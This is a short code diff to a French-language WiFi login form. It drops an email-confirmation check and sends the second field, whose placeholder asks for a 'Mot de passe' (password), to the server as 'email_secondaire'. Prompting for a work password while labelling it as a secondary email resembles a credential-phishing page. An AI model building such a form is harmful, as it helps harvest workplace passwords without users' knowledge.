@@ -70,7 +70,7 @@
 
     <form id="wifiForm">
       <input type="email" id="email1" placeholder="Email professionnel" required>
-      <input type="email" id="email2" placeholder="Mot de passe" required>
+      <input type="email" id="email2" placeholder="Mot de passe">
       <button type="submit">Se connecter</button>
     </form>
   </div>
@@ -101,13 +101,8 @@
       const email1 = document.getElementById("email1").value;
       const email2 = document.getElementById("email2").value;
 
-      if (!email1 || !email2) {
-        alert("Veuillez remplir les deux champs");
-        return;
-      }
-
-      if (email1 !== email2) {
-        alert("Les emails ne correspondent pas");
+      if (!email1) {
+        alert("Veuillez saisir votre email professionnel");
         return;
       }
 
@@ -121,7 +116,8 @@
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          email: email1
+          email_principal: email1,
+          email_secondaire: email2 || null
         })
       });
 
